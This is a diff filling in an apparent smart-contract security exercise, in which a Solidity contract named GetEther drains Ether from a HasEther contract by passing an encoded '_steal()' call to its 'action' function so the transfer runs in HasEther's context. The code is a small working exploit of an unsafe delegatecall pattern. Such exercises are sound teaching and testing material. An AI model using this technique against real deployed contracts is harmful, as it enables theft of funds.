@@ -6,9 +6,21 @@ import {console} from "forge-std/console.sol";
 contract GetEther {
     // write any code you like inside this contract, but only this contract
     // get the Ether from the HasEther contract. You may not modify the test
+    address private immutable _self;
     
+    constructor () {
+        _self = address(this);
+    }
+
+    receive() external payable {}
+
+    function _steal() public {
+       (bool ok, ) = payable(_self).call{value: address(this).balance}("");
+        require(ok);
+    }
+
     function getEther(HasEther hasEther) external {
-        //...
+        HasEther(hasEther).action(address(this), abi.encodeWithSignature("_steal()"));
     }
 }
 
